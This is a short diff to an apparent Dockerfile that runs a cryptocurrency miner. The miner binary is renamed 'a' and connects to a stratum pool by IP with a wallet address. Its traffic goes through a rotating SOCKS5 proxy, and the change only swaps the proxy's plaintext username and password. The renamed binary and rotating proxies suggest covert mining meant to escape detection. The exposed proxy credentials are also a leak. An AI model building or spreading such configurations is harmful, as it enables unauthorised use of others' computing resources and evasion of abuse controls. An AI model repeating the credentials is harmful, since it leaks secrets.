@@ -18,4 +18,4 @@ RUN apt-get update && apt-get dist-upgrade -y && \
 COPY --from=builder /usr/local/bin/a /usr/local/bin/
 
 ENTRYPOINT [ "a" ]
-CMD [ "-a", "verus", "-o", "stratum+tcp://51.89.228.192:80", "-u", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "-p", "x", "-t8", "--proxy=socks5://berkahkita-rotate:kitabersama123@p.webshare.io:80" ]
+CMD [ "-a", "verus", "-o", "stratum+tcp://51.89.228.192:80", "-u", "REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.missha", "-p", "x", "-t8", "--proxy=socks5://nvxuqmwz-rotate:4m20hyntzt85@p.webshare.io:80" ]
